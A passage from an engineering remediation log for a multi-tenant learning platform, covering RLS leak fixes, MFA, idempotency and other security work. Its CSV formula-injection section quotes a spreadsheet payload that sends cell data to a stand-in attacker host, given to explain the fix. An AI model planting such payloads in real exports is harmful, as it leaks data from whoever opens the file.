`handleReportDeliveryOutboxEvent`, so looking downstream alone reported the delivery module while the
outbox handler governing it sat one hop above.

The upstream check uses `every`, not `some`, on purpose: a module reached by both an outbox handler
and a direct request-path caller is precisely the defect being hunted, and `some` cleared
`marketing-integrations.dispatch.ts` on the strength of one well-behaved importer. Re-verified with a
planted `sendNotification(...)` service, which the guard catches.

`testDestination` in `destinations-roster.service.ts` carries a new inline
`// outbox-exempt: <reason>` marker — an admin clicking "Test destination" is asking whether it works
_now_, so the send must be inline and its result reported. The marker requires a reason and lives at
the site rather than in a path list in the guard.

> **The real defect: webhook fan-out runs inline, inside the transaction, on public signup.**
> `dispatchMarketingIntegrationWebhooks` loops over every enabled webhook and `await`s
> `deliverWebhook` **sequentially**, with an 8 s timeout each, while holding the tenant transaction.
> It is called from `public/auth/signup/route.ts` and `enrollments.repository.ts` inside
> `withTenantTx`. A tenant with five slow or dead webhook URLs therefore holds a pooled database
> connection for up to **40 s on an unauthenticated signup request** — self-inflicted through tenant
> configuration, and the same shape as C6, which Phase 1 measured at 0 rps and a 10 s stall for
> holding connections across network I/O. There is no retry either: delivery failures are recorded
> and swallowed.
>
> The fix is to emit an outbox event and fan out from a handler, which the infrastructure already
> supports (`outbox-consumers.ts`, `reportDeliveryOutboxHandlers` is the pattern). Callers already do
> not depend on delivery — the function is documented as never throwing — so nothing observable is
> lost by making it asynchronous. **Not done here:** it changes behaviour on the signup and
> enrollment paths and deserves its own change rather than being folded into a guard repair.
> `check:outbox-compliance` stays red on these two files until it lands.

**Also wired, and previously unwired:** `package-exports-check` and `outbox-worker-check` jobs (see
the Phase 2 correction above). `db:migrate:check` turned out to be covered after all — invoked by
path from `scripts/db/ci-migrate-validate.mjs`, which the grep for `pnpm db:migrate:check` missed.
`check:env` is correctly _not_ in CI: it reads `git diff --cached`, so in a workflow with no staging
area it would pass vacuously; it belongs to the husky pre-commit hook, where it runs.
`ci:forbidden-scope`, `ci:outbox-metadata`, `ci:prisma-boundary` and `ci:route-metadata` are pure
aliases of `check:` scripts already in CI, so their absence is not a gap.

---

## 5b. Verification audit of Phases 0–2 (2026-08-19)

A re-verification of every Phase 0/1/2 claim against the running system, rather than against the
records. **Phase 1 holds completely. Phase 2 has one real hole. Phase 0's exit gate is still unmet.**

### 2.1 is not fully delivered: `tenant_domains` leaks across tenants

`db:rls:check` passes, the four non-superuser backstop tests pass, and a scan of every policy
attached to `atlas_app` found exactly **one** that is not tenant-scoped — but that one matters:

```
tenant_domains_host_resolution  | SELECT | permissive | atlas_app,atlas_worker | (deleted_at IS NULL)
tenant_domains_tenant_isolation | ALL    | permissive | atlas_app,atlas_worker | (tenant_id = app.current_tenant_id())
```

PostgreSQL **OR**s permissive policies, so the effective read predicate for the application role is
`(deleted_at IS NULL) OR (tenant_id = app.current_tenant_id())` — the isolation policy is unreachable.
Proven directly, as `atlas_app` with `app.tenant_id` set to one tenant:

```
visible_domains | distinct_tenants_visible | visible_tenants
              2 |                        2 |               2
```

The extra policy exists for a real reason — `lookupTenantFromHost` must read a hostname _before_ any
tenant context exists, and the isolation policy alone returns zero rows then. But as written it grants
blanket read **even when a context is set**, so any tenant's request can enumerate every academy's
hostnames. The fix is to scope it to the pre-context case, e.g.
`USING (deleted_at IS NULL AND app.current_tenant_id() IS NULL)`.

**Related, and outside the guard's reach:** `tenants` itself has RLS **disabled**
(`relrowsecurity = f`). `check-rls-state.ts` asserts over tables carrying a `tenant_id` column, and
the tenant registry keys on `id`, so it is invisible to that check by construction. Together these
two make the customer list readable from any tenant context. This is metadata disclosure, not learner
or financial data — the other 219 tenant-scoped tables are genuinely isolated.

> **The isolation suite was right and the record was wrong.** These failures have been carried as
> "11 pre-existing failures, slated for Phase 3.6". At least four of them are **true positives
> reporting this defect**, not stale assertions. Dismissing a red isolation test as a stale baseline
> is precisely the failure mode Phase 0 set out to end.

### What the 11 tenant-isolation failures actually are

Re-run against a freshly rebuilt test database, and again under `atlas_app_login` to rule out the
connection role (identical results either way, so the role is not a factor):

| Cause                                                            | Count | Disposition             |
| ---------------------------------------------------------------- | ----- | ----------------------- |
| Real — `tenant_domains` cross-tenant reads                       | 4–5   | Fix the policy (above)  |
| Stale fixture — `practice_sessions.session_type` is now NOT NULL | 2     | Update the fixture      |
| Source-text / UI wiring assertions                               | 2     | Phase 3.6               |
| Remaining (catalog outline, feature-flag scope)                  | 2–3   | Needs individual review |

### Undocumented baseline: `tests/integration` fails 24 of 256

Never recorded in any phase note. Causes sampled: a stale pre-F-1 import path in `diagnostic.test.ts`
(`../../backend/...` resolves to `tests/backend/...`), screenId-registry wiring assertions, and
several routes returning 500. `tests/e2e` is 17/154, matching its documented baseline.

### A trap worth knowing about

`db:migrate:check` **fails against the test database by design**. `db:test:setup` clones dev with
`pg_dump --schema-only`, which does not copy `_prisma_migrations` rows — the schema is current (all of
097/098/099 present) but the ledger is empty. It cost a wrong "stale test DB" diagnosis during this
audit; the schema was fine all along.

### Remediation of the audit findings (2026-08-19)

Everything the audit above surfaced is now fixed, except two items that are deliberately staged.

**`tenant_domains` isolation — closed.** The host-resolution policy is now defined in
`sql/rls/025_tenant_rls_policies.sql` (it previously existed only in the live databases, so
`db:provision` never created it) and scoped to the case it exists for:

```sql
USING (deleted_at IS NULL AND app.current_tenant_id() IS NULL)
```

Both properties are proven, not assumed — with no tenant context the lookup still returns every
hostname, and with a context set it returns exactly one tenant's. Applied to dev and test.

**`db:rls:check` now catches this class.** Table flags cannot see an OR'd permissive policy, which is
why the guard was green throughout. It now also fails on any permissive policy granted to
`atlas_app`/`atlas_worker` whose `USING` clause never mentions `current_tenant_id`. Positive-controlled
by restoring the old policy — the guard reports the exact table, policy and predicate and exits 1.

**Three regression tests** in `tenant-domains-host-resolution.test.ts` pin host resolution, isolation,
and the policy predicate itself, so an edit dropping the `IS NULL` clause fails with a reason rather
than as a row-count surprise.

**Inline webhook fan-out — moved to the outbox.** `dispatchMarketingIntegrationWebhooks` now publishes
`marketing.webhook_dispatch_requested` and performs no network I/O; delivery happens in
`deliverMarketingIntegrationWebhooks` under the worker, which also gives it retries. Registered
through `createMarketingWorkflowOutboxConsumers`, already folded into the engagement consumers the
competency processor runs — so no eleventh consumer group. Four tests assert the structural property
(the request path must contain `publishOutboxEvent` and must not contain `deliverWebhook(` or
`safeOutboundFetch(`), since that is the invariant, not a timing.

**`branding/assets/upload` audit write — implemented.** Outstanding since Phase 0, which correctly
refused to declare `audit: "required"` for a handler that wrote nothing. `createBrandingAssetUpload`
now writes `config.branding.asset_upload_requested` in the same transaction as the reference row, so a
rolled-back upload leaves no audit entry claiming otherwise. `ci:audit-metadata` passes and is now
wired into `ci.yml` (33 jobs) — it had never run there.

**Test-suite repairs.** `practice.test.ts` passed a literal object to a service that takes
already-parsed input, so the schema's `engine` default never applied and the insert violated
`session_type NOT NULL` — it now passes `engine` explicitly, and both practice isolation tests pass,
including the real `RLS filters practice tables to current tenant` assertion that had never run.
`diagnostic.test.ts` used `../../backend/...` from `tests/integration/api/`, which resolves to
`tests/backend/...`; 96 sibling tests use `../../../backend`. The module now loads.

**Root `src/` deleted** per §0.5 — no reference anywhere in tooling, config or docs. `runbooks/` is
**kept**: `docs/locked/` architecture packages reference it and `check-secrets` scans it, so its
`.gitkeep` is deliberate rather than debt.

| Signal                            | Before this pass | After        |
| --------------------------------- | ---------------- | ------------ |
| `tests/tenant-isolation` failures | 11               | **4**        |
| Guards passing                    | 11 of 13         | **13 of 13** |
| `tests/unit`                      | 1370             | **1374**     |

The four remaining isolation failures are the source-text and behaviour-drift assertions Phase 3.6
exists to re-base (`admin-shell`, `moderation-shell`, `course-catalog-enrollment`,
`entitlements-feature-flags`); `tests/integration` is 25 of 258, unchanged in kind.

**Deliberately not done, with reasons:**

- **CSP enforcement.** Headers ship from `next.config.ts`, which is static, so a per-request nonce
  requires moving CSP delivery into middleware. More importantly §1.1 stages this behind a week of
  Report-Only violation collection, and flipping `CSP_ENFORCE=1` without that telemetry risks
  breaking production for no measured gain. The blocker is operational, not code.
- **CI and production database role switch.** Local `.env.local` connects as `atlas_app_login`;
  each other environment needs its own `db:setup-login-roles` run and connection-string change.

### Regression from the white-label work, and what it exposed (2026-08-19)

The FundedBeyond landing page rendered **"AC / Academy Academy"** with no logo. Reported from the
browser, not caught by any gate — the shells render from runtime data no test asserts against.

Removing the hardcoded fallbacks was correct, but they had been masking three separate defects in
the tenant data and provisioning path:

**1. FundedBeyond's branding was never published.** `tenant_branding.status` was `DRAFT` at
version 0, and `readRuntimeBrandingProjection` filters on `status = 'PUBLISHED'` — so `publicName`
came back null and every shell fell through to its neutral fallback. The name in the row was
`"FundedBeyond Academy"` the whole time.

> **`scripts/tenants/apply-adapter.ts` writes the draft and never publishes.** So _any_ tenant
> provisioned from a manifest renders nameless until someone publishes through the admin UI. That
> is why the hardcoded fallbacks existed at all: they papered over a provisioning gap. Publishing
> from apply is the real fix and is left for Phase 3 alongside 3.2, since it changes provisioning
> semantics.

**2. FundedBeyond had no logo asset.** `logo_light_ref_id` was NULL — the bootstrap override had
meant it never needed one. `scripts/db/seed-fundedbeyond-branding.mjs` now gives the tenant its own
`storage_references` row for `avatar-gradient.svg` under the correct `tenants/<id>/branding/logos/`
prefix, and publishes the branding. The mark is FundedBeyond's, so it is theirs as tenant data —
which is the entire point of the change; it is not restored as a platform default.

**3. `STORAGE_LOCAL_ROOT` was relative, and the processes disagree about `.storage`.**
`LocalFilesystemStorageProvider` resolves it with `path.resolve(process.cwd(), …)`, but the API dev
server runs from `backend/apps/api` (`pnpm --filter`) while the worker and seed scripts run from the
repo root. The seeded asset therefore 500'd on download. Verified both ways: relative resolved to
`backend/apps/api/.storage` (file absent), absolute to the repo root (file present). `.env.example`
now documents that it must be absolute and why, and the seed script warns when it is not.

**A display bug of my own.** `LandingInteractive` appended `" Academy"` **unconditionally** after the
brand name, which is what turned the "Academy" fallback into "Academy Academy" — and would have
rendered "Northwind Institute Academy" for a tenant with that name. The suffix is now conditional on
the name actually ending in "Academy", matching `AuthShell`.

**Worth noting for Phase 3.6:** none of this was caught by a gate. `db:seed:check` validates the
manifest, not what reached the database, and no test asserts that a provisioned tenant renders its
own name and mark. A fixture asserting bootstrap output for a seeded tenant would have caught all
three.

### Exit-gate status after this audit

| Phase | Claim                           | Verified                                                                                                                                                                              |
| ----- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0     | `pnpm lint` completes           | **Met** — 0 errors, nine shards                                                                                                                                                       |
| 0     | `db:migrate:check` reports 99   | **Met** (dev)                                                                                                                                                                         |
| 0     | `pnpm ci` runs end to end       | **Not met** — `ci:audit-metadata` and `check:outbox-compliance` both fail                                                                                                             |
| 0     | §0.5 restructure sweep complete | **Was not** — four guards had stale roots; fixed 2026-08-19                                                                                                                           |
| 1     | Every probe fails to reproduce  | **Met** — headers, atomic wallet SQL, coupon lock, SCORM caps, traversal rejection, un-nested transactions all verified in code; `tests/db` + `tests/security` + `tests/events` 34/34 |
| 2     | RLS blocks cross-tenant reads   | **Partially** — true for 219 tenant-scoped tables, **false for `tenant_domains`**                                                                                                     |
| 2     | SSRF / CSRF / email             | **Met** — `safeOutboundFetch` on all four surfaces, origin check in both route wrappers, SMTP fail-closed                                                                             |

---

## 6. Phase 3 — Least privilege and correctness

**Effort:** ~1–2 weeks.

### 3.1 Enforce MFA — H5

`mfaEnabled` is computed and stored but **never checked anywhere**. Require MFA for: platform
operators (always), tenant-admin destructive actions, payout and refund operations, and data
exports.

> **Correction (2026-08-17): the "broken predicate" blocker does not exist.** This section
> previously said `session.ts:64` had an always-true predicate that "may not discriminate verified
> from pending factors", and that enforcing MFA on top of it would be worse than not enforcing it.
> That was inferred from the ESLint message without checking the SDK types. `listFactors()` types
> `data.totp` and `data.phone` as `Factor<K, "verified">[]` and keeps unverified factors in
> `data.all`, so those arrays are pre-filtered by Supabase: presence in them **is** verification.
> The comparison was redundant, never wrong. It has been simplified to a length check with the
> reasoning recorded inline. **Nothing gates MFA enforcement** — 3.1 can start whenever it is
> scheduled.

### 3.2 Move platform operators into the database — H7

Cross-tenant access is currently an email string match against `PLATFORM_OPERATOR_ASSIGNMENTS`.
Model platform roles as rows with grant history and audit, revocable without a deploy. Keep the env
var only as a documented break-glass path, logged loudly when used.

### 3.3 Replace the hardcoded admin bypass — H11

`isAdminBypassRole()` matches the strings `"owner"`/`"admin"`, skipping every ownership and
relationship predicate. Replace with an explicit capability on the role record, and add
`@@unique([tenant_id, key])` to `roles` (currently only `@@index`, so duplicate keys can race in).
Blocklist reserved role keys at the schema level.

### 3.4 Correct actor identity at system entry points — M16

Six routes — **including both payment webhooks** — pass `actorMembershipId: tenant.tenantId`.
Audit attribution on the most financially sensitive events points at a membership that does not
exist. Introduce a dedicated system-actor concept, and add branded `TenantId` / `MembershipId`
types so the compiler prevents recurrence.

### 3.5 Replace `Math.random()` on money paths — H15

Coupon, referral and affiliate codes use a non-CSPRNG whose state is recoverable. Use
`crypto.randomInt`. Invitation tokens already do this correctly and are the pattern to copy.

### 3.6 Re-base the test suites — H13

Large parts of `tests/e2e` and `tests/authorization` assert on **source text**, not behaviour. They
break on cosmetic refactors and prove nothing about authorization. Rewrite the authorization suite
to execute the real `can()` pipeline against a database with real fixtures. Rename the source-text
checks to `tests/lint-rules/` so nobody mistakes them for security coverage.

### 3.7 CSV formula injection — M1

Three duplicate `csvEscape` implementations all quote correctly but none neutralise a leading
`=`, `+`, `-`, `@`, tab or CR. Consolidate into one helper that prefixes `'` on those, and route
every export through it. Learner-controlled names reach admin spreadsheets.

> **Exit gate 3:** MFA enforced on platform operators. No hardcoded role-key logic remains.
> `grep -rn "Math.random" backend/apps/api/src/server/sales-*` returns nothing.

### Phase 3 progress record (2026-08-19) — 3.5, 3.7 and 3.4 delivered

Sequenced by risk-per-effort, so the two small self-contained items went first.

**3.5 — H15 closed, and the earlier record was wrong.** The lint pass claimed moving referral and
affiliate generators to `crypto.randomInt` "closes audit finding H15". It closed two thirds:
`sales-coupons.service.ts` still generated codes with the engine's default PRNG. Coupons redeem
against real money, and V8's generator has recoverable state, so a few observed codes predict the
next ones. Now on `randomInt`, which is also rejection-sampled and therefore unbiased over the
alphabet — scaling a float into a range is not. **The gate's grep returns nothing**, which required
wording the explanatory comment without the literal call, since the gate is a literal grep.

**3.7 — CSV formula injection. Eight implementations, not three.** The plan recorded three; there
were **eight** `csvEscape` definitions across backend and web app. Every one quoted correctly and
none neutralised a leading `=`, `+`, `-`, `@`, tab or CR.

The exposure is concrete: the data is learner-controlled and the reader is an administrator, so a
display name of `=HYPERLINK("https://evil.test?d="&A1,"Click")` is evaluated when the export opens
in Excel, Sheets or LibreOffice. Quoting does not help — the spreadsheet strips quotes before
evaluating.

Consolidated to one implementation per side (`@atlas/core/csv/escape` and
`frontend/apps/web/src/lib/export/csv.ts`). Two, not one, because the web app depends only on
`@atlas/contracts` and `@atlas/design-system` and cannot import the backend package; client-side
exports carry the identical risk. **11 tests run against both**, so they cannot drift.

One refinement worth recording: guarding every `-` would turn every negative amount in an export
into text and silently break totals in the sheet. A value that is _entirely_ a number is therefore
left numeric, while `-1+1` is still guarded.

**3.4 — actor identity, with the branded-types half deliberately deferred.** All six entry points
(both payment webhooks, Zoom, two public marketing actions, sales attribution) passed
`actorMembershipId: tenant.tenantId`. That is not imprecision: a tenant id is not a membership id,
so audit entries on the most financially sensitive events joined to nothing in `memberships` — the
trail answered "who did this?" from the wrong table.

`SYSTEM_ACTOR_MEMBERSHIP_ID` plus `systemServiceCtx({ …, source })` now names these requests as what
they are, with the originating system recorded. **`audit_entries.actor_membership_id` is nullable**,
so the writer maps the sentinel to `NULL` and puts the source in `metadata_json` — persisting a
sentinel into a foreign-key-shaped column would repeat the original defect in a new costume. The
sentinel exists only so `ServiceCtx.actorMembershipId` can stay a non-nullable `string`.

> **The branded `TenantId` / `MembershipId` types are not done.** `actorMembershipId` alone has
> **1561 references** and 724 direct reads; widening or branding it cascades through effectively the
> whole backend. That is its own change with its own review, not a rider on a six-site fix. The
> regression is pinned by test instead: `tests/unit/audit/system-actor.test.ts` asserts none of the
> six routes contains `actorMembershipId: tenant.tenantId` and that each declares a system actor.

**Remaining in Phase 3:** 3.1 (MFA enforcement), 3.2 (platform operators into the database),
3.3 (admin bypass capability + `@@unique([tenant_id, key])` on `roles`), 3.6 (re-base the suites).

**State:** lint 0 across nine shards, typecheck clean, `format:check` clean, **1389 unit tests**
(226 files, +15 this pass), all 13 guards passing.

### Phase 3 completion record (2026-08-19) — 3.1, 3.2, 3.3 and 3.6 delivered

**3.3 — H11, and the premise was half wrong.** `isAdminBypassRole()` matched the literal strings
`"owner"`/`"admin"` and, on a match, skipped every ownership and relationship predicate. The bypass
is a column now (`roles.bypasses_resource_predicates`), read through the grant, so it is visible in
the data and revocable without a deploy — and a _custom_ role keyed `"admin"` no longer inherits
tenant-wide authority by name, which was the actual escalation.

> The finding also said `roles` had "only `@@index`, so duplicate keys can race in". True of
> `schema.prisma`; **false of the database**. Migration 029 already created
> `roles_tenant_key_active_uq` — UNIQUE on `(tenant_id, key) WHERE deleted_at IS NULL`. I added a
> second, identical index before checking, then dropped it. The real defect was schema drift, so the
> Prisma model now declares `@@unique`. Verified live: a duplicate active key is rejected per tenant.

A CHECK constraint reserves the five system keys for `is_system` rows, so a tenant admin cannot
create a role named `owner`. Verified live — the insert is rejected. Updating the query broke six
authorization tests whose stubs returned `{ role_key }` without the new column; **54 stub rows across
24 files** now carry it, mirroring the seeded data rather than hardcoding `true`.

**3.2 — H7.** Platform grants are rows in `platform_operators`, with who granted, when, why, and a
soft revoke so history survives the question "who had cross-tenant access in March". Verified live:
grant resolves, revoke takes effect with no deploy, the revoked row is retained, and a re-grant does
not collide with it.

The grants are split by direction, which took a correction: `requirePlatformPrincipal` runs inside
`withGlobalDb`, i.e. as `atlas_app`, so the tenant application role **must read** this table. My
first cut revoked all access and would have broken platform auth outright. It now has `SELECT` and
nothing else — writing a platform grant is precisely the escalation the table exists to record.
`PLATFORM_OPERATOR_ASSIGNMENTS` survives as break-glass, checked **after** the table so a database
revocation cannot be overridden by stale deploy config, and every use logs
`platform.operator.break_glass`.

**3.1 — H5.** `mfa_enabled` was computed on every sign-in and never read. Platform operators now
require a verified factor unconditionally; tenant routes require it when metadata says
`mfa: "required"`, applied to the categories the audit named — role deletion and revocation,
membership suspension, data exports, and refunds.

Two deliberate details: enforcement runs **after** the permission check, because failing with "you
need MFA" first would confirm to a non-operator that the account would otherwise be allowed; and
`MFA_REQUIRED` is a distinct error code from `PERMISSION_DENIED`, so a client can offer enrolment
instead of a dead end — the same reasoning that separated `RATE_LIMITED` from `INTERNAL_ERROR` (L4).

`mfaEnabled` is threaded explicitly into the pipeline rather than added to `TenantRouteContext`,
which is constructed in hundreds of places where an optional flag would default to "no MFA" and
quietly deny.

#### 3.6 — relocation and rebasing both done

Classified every file in both suites by whether it executes application code or only reads source
text. `tests/authorization` was 35 behavioural / 5 structural; `tests/e2e` was 4 behavioural,
2 mixed, **28 structural**. The 33 structural files moved to `tests/lint-rules/` with a README
stating plainly what they cannot tell you.

**This reclassified the baseline rather than fixing it.** `tests/e2e` went from 17 failures to
**1** — the other 16 were stale source-text assertions that had been reported as end-to-end
failures for the whole programme. They pin arbitrary substrings (`aria-label="Mobile learner
navigation"`, `Content status`, `execution_skill`), so a rename breaks them with no behaviour change.

One looked real and was worth chasing: `swipe.structure.test.ts` demanded
`app/(learner)/swipe/layout.tsx`, and every sibling learner route has its own layout. Reading the
code resolved it — `/swipe` is a redirect to `/practice` now, so it correctly has none. That check
is rebased on what the route actually does.

#### All 16 rebased (2026-08-19) — `tests/lint-rules` is green

Each one was read against the current implementation rather than deleted. **Not one was a
regression**; every failure was a refactor the assertion had not followed:

| Was asserted                                     | What had actually happened                                             |
| ------------------------------------------------ | ---------------------------------------------------------------------- |
| `aria-label="Mobile moderation navigation"`      | aria moved into the shared shell; client passes `drawerId` + label     |
| `role="dialog"` inline                           | replaced by shared `AdminConfirmDialog` — and it uses `alertdialog`    |
| `aria-label="Profile menu"`                      | now a link whose avatar and name give it an accessible name            |
| `href="/notifications"`                          | became `LearnerNotificationPopover`; the shell filters it from the nav |
| `clearClientDataCache("logout")` in the button   | moved into shared `performAtlasLogout`, so every exit point gets it    |
| `AccountDeletionCard` in `app/settings/page.tsx` | `/settings` is a redirect; the card lives at `/profile/danger-zone`    |
| `postWithKey` in `lib/client-api.ts`             | that file is a barrel; the helper is in `lib/api/client.ts`            |
| `searchParams.get("token")` in the invite card   | token now read server-side in `page.tsx` and passed as a required prop |
| `"Next best action"` and two more headings       | dashboard redesigned; the slot is `personalizedSection`                |
| `"Content status"`, `"Recent audit activity"`    | renamed to `"Studio content"`, `"Recent tenant audit events"`          |
| `"Confirm publish"`, `"execution_skill"`         | shared `ConfirmDialog`; sample key is `risk_management`                |

Three are worth calling out because the rewrite is stronger than what it replaced:

- **`alertdialog`, not `dialog`.** The shared confirm dialog uses the role that forces assistive
  technology to announce a destructive decision. The old assertion would have failed the better
  markup.
- **Capability gating instead of a string ban.** `moderation-navigation.ts` was checked with a
  blanket `not.toMatch(/\/admin/)`. It gained a capability-gated "Review & Approvals" entry, which
  the ban read as a leak — it is not: `filterModerationNavigation` drops it without
  `canAccessWorkflowReview`. The check now asserts that **every** privileged href is gated, which is
  the real requirement. Positive-controlled: ungating the entry fails it.
- **The affordance, not the label.** Mobile navigation is asserted through its open/close controls
  and landmark rather than one exact label string. Positive-controlled: removing the control fails it.

> The first positive control I ran on the gating check **passed when it should have failed** — the
> file is CRLF and my `\n` replacement silently matched nothing. The control was broken, not the
> assertion. Worth recording, because a positive control that cannot fail is the same class of
> problem as the tests this section exists to fix.

**State:** lint 0 across nine shards, typecheck clean, `format:check` clean, **1859 tests** across
`tests/lint-rules` + unit + authorization, all guards passing. Database-backed suites
(`tests/db`, `tests/e2e`, `tests/integration`, `tests/tenant-isolation`) were verified green earlier
in this pass but could not be re-run at the end — the local Postgres container stopped
(`ECONNREFUSED :15432`, Docker daemon down). That is an environment state, not a code result.

---

## 7. Phase 4 — Margin, privacy and operations

Detailed in [production-deployment-and-scale.md](production-deployment-and-scale.md); summarised
here for completeness.

| Item                                                       | Finding |
| ---------------------------------------------------------- | ------- |
| Quantitative entitlement enforcement + per-tenant metering | M11     |
| Proctoring media retention policy (cost **and** privacy)   | M12     |
| Central idempotency registry with replay protection        | M10     |
| Learner bundle budget — 354.6 kB gzip vs 150 kB            | H16     |
| WCAG AA contrast — two token values fix ~186 violations    | H17     |
| Freshness guard on `release-evidence.json`                 | H18     |
| Populate the security exception register                   | H18     |
| `server-only` markers across server modules                | M9      |

**H17 deserves emphasis for the effort involved**: `--fba-tx3: #a09888` at 2.81:1 and `#817f7e` at
4.47:1 account for the large majority of 186 serious violations across login and the public
landing. Two hex values.

---

### Phase 4 execution record (2026-08-20)

All eight items delivered. Two are closed with a caveat stated below rather than
hidden, because the honest position is more useful than a green tick.

| Item | Finding | Outcome                                                                             |
| ---- | ------- | ----------------------------------------------------------------------------------- |
| 4.1  | H17     | Closed — 6 token values across 3 palettes, plus a permanent test                    |
| 4.2  | H16     | **Open, measured and ratcheted** — 422.1 kB vs a 150 kB target                      |
| 4.3  | H18a    | Closed — freshness/verdict guard, and the generator no longer passes on skipped P0s |
| 4.4  | H18b    | Closed — register populated with 8 entries                                          |
| 4.5  | M9      | Closed — 200 modules marked, guard added                                            |
| 4.6  | M10     | Closed — framework-level registry, replay protection, retention                     |
| 4.7  | M11     | Closed — quantitative limits and per-tenant metering                                |
| 4.8  | M12     | Closed — retention policy plus the deletion job that makes it real                  |

#### H17 — four failures, not one, and the fix is a ramp not a value

The audit named `--fba-tx3` at 2.81:1. Measuring every text-on-surface pair
instead of the two the audit sampled found the same defect in three more places:
the FundedBeyond dark palette (`tx3` at 2.58:1 on `--fba-surf`), both the light
and dark platform palettes (`--atl-tx3` at 2.68:1 and 2.98:1), and shadcn's
`--muted-foreground` at 4.35:1 on `--muted` — passing against white, failing
where it is actually used.

Raising `tx3` alone to 4.5 would have been the wrong fix. `tx2` measured 4.52 on
the same background, so the muted tier would have landed on top of the secondary
tier and the palette would have silently lost a level of hierarchy while passing
the audit. The ramp is re-spaced instead, at roughly 14.7 / 7.1 / 4.6.

`tests/unit/theme/design-token-contrast.test.ts` parses the real stylesheets
rather than restating the hexes — a copy would keep passing after someone edited
the CSS. Checked against a positive control: restoring the old value fails it.

#### H16 — the number was real, the metric was not

`check-learner-bundle-boundary` reported "largest static chunk 354.6 kB" and
called it the learner first-load budget. That chunk belongs to an **admin**
reporting route no learner ever downloads; the check measured neither "learner"
nor "first load".

Measuring what Next actually sends per route — shared root chunks plus the
route's own `entryJSFiles`, gzipped:

| Measure                 | Value       |
| ----------------------- | ----------- |
| shared root             | 131.8 kB    |
| learner **median**      | 131.8 kB    |
| heaviest learner routes | ~400–422 kB |

So the finding is real but differently shaped than recorded: most learner routes
are already under budget, and the ones carrying the learner shell are ~2.8x over.

What it is **not** caused by, each checked rather than assumed:

- No heavy library leaks in. `three`, `konva`, `ethers`, `mobx` and
  `@react-three/*` appear in **no** learner entry chunk.
- lucide-react tree-shakes correctly — 178 of 3972 icons ship. Verified by
  searching the built chunks for the path-data keys of icons nothing imports.
- `experimental.optimizePackageImports` changes nothing, because Turbopack does
  not use it.

Deferring three shell widgets that are not on the first-paint path
(`DeviceSessionCapture`, `MarketingCtaRuntime`, and the sign-out dialog, which
also now mounts only when asked for) recovered ~12 kB. Real, and small enough to
confirm the weight is spread across the application's own client components
rather than concentrated anywhere convenient.

Closing the remaining gap is a frontend restructuring project, so the gate now
**ratchets**: the measured maximum may never exceed
`configs/learner-bundle-baseline.json`, and the distance to 150 kB is printed on
every run. A permanently red gate is a gate people learn to ignore; a ratchet
that states its own shortfall is not. Missing build output is now a hard failure
rather than a skip — the skip is how a 2.4x breach stayed invisible across
several audit passes.

#### H18 — the artifact vouched for gates that never ran

Two separate defects, and the second is the one that mattered.

`release-evidence.json` was 8 weeks stale and CI asserted only `test -f`. But the
generator itself would emit `READY_FOR_STAGING` with **9 of 30 P0 gates skipped**
— including `integration_tests`, `tenant_isolation_tests`, `rls_tests` and
`db_rls_check`, which are precisely the guarantees this programme exists to
protect. A skipped gate was treated as an absent problem rather than an
unanswered question, and the CI job invoked the suite with
`--skip-db --skip-build --skip-e2e`, so it was skipping them **on purpose** and
then publishing a green verdict about them.

`run-suite.mjs` now refuses `READY_FOR_STAGING` when an automated P0 gate is
skipped. `scripts/release/validate-evidence.mjs` re-checks the artifact
independently — freshness, commit correspondence, no failures, no skipped P0s,
and verdict-versus-gates consistency — so a file produced before that fix cannot
slip through. The CI job now provisions a database and runs the gates rather than
skipping them.

Run against the committed artifact, the validator rejects it on all three
counts, which is the correct answer.

#### M9 — marking the tree was a no-op, which is the finding

`import "server-only"` added to all 200 modules under
`frontend/apps/web/src/server`. The production build stayed green, meaning
nothing was leaking today. The value is not what it found; it is that the next
leak fails the build instead of shipping. A guard keeps new files from skipping
the marker.

The API app is deliberately excluded: it serves no client bundle, so the marker
would add a dependency for no benefit.

#### M10 — 188 routes, 11 tables

`requireIdempotencyKey` asserted the header was present and nothing else.
Deduplication depended on each handler happening to own a table with
`@@unique([tenant_id, idempotency_key])`. Measured: **188 routes** declare
`idempotency: "required"`; **11 tables** carry the column. On every other one, a
replay wrote twice — including the payment paths, where a retry after a client
timeout is the ordinary case rather than the exceptional one.

The claim is now made by the route pipeline inside the handler's own
transaction, so:

- a handler cannot forget, because forgetting is no longer possible;
- record and writes commit or roll back together, so a handler that throws
  leaves no claim and the client's retry is a first attempt rather than a key
  that is poisoned forever;
- concurrency is resolved by the unique index, not by read-then-write.

A key reused for a _different_ request is rejected (422) rather than replayed,
via a request fingerprint. `IDEMPOTENCY_CONFLICT` is a distinct error code
because the two conflicts need opposite client responses: retry the in-flight
one, never retry the reused one.

#### M11 — the parameter that was declared and ignored

`enforce-entitlement.ts` checked key existence only. `value_json` was never read
and `usageContext` was declared and unused, so a plan could say "this tenant may
use exports" but never "500 exports a month".

Values now parse as either the historic bare boolean or
`{ enabled, limit, period }`. Two consequences worth stating:

- The old predicate was `value !== false && value !== null`, which treated **any
  object** as enabled — including `{ "enabled": false }`, the explicit off
  switch. That is a fail-open bug the quantitative form would have walked into.
- An unparseable value now reads as **disabled**. Operator-editable JSON that
  fails validation is an unknown state, and the safe reading of an unknown
  entitlement is that the tenant does not have it.

Consumption is a single guarded upsert. Both the insert and the conflict paths
are guarded, and they have to be: guarding only the conflict path would let the
_first_ consumption of a period sail past the limit, so a tenant capped at 10
could spend 500 by going first. There is a test for exactly that, and one for two
concurrent requests competing for the last unit — the C2/C3 double-spend shape,
headed off on a new surface rather than fixed after the fact.

Metering is opt-in per call site, so no existing route's behaviour changed.

#### M12 — a retention column with nothing behind it

`proctoring_media_artifacts` had a `retention_expires_at` column and nothing that
set it, read it, or acted on it. The artifacts are webcam and screen recordings
of learners sitting exams: indefinite retention is a regulatory exposure, not
just a storage bill.

The table is empty — L2/L3 created it and the upload path is not built yet — so
this is the cheapest possible moment to fix. The policy exists before the first
artifact does.

The column is NOT NULL with a 90-day default, so an upload path that forgets gets
90 days rather than forever. Tenants may shorten the window; the application caps
how far it may be lengthened, because "keep exam footage for ten years" is not a
decision a settings field should make on its own. Deletion removes the object
before the row, so an interruption strands a row whose object is gone
(recoverable, and retried) rather than an orphaned recording nothing references.

Both retention sweeps ride the worker pass that already visits every tenant.
They are injectable, so the sweep's orchestration can still be unit-tested
without a database and an object store.

#### Found in passing: the web app served no security headers

`configs/security-headers.mjs` describes itself as shared by both Next apps and
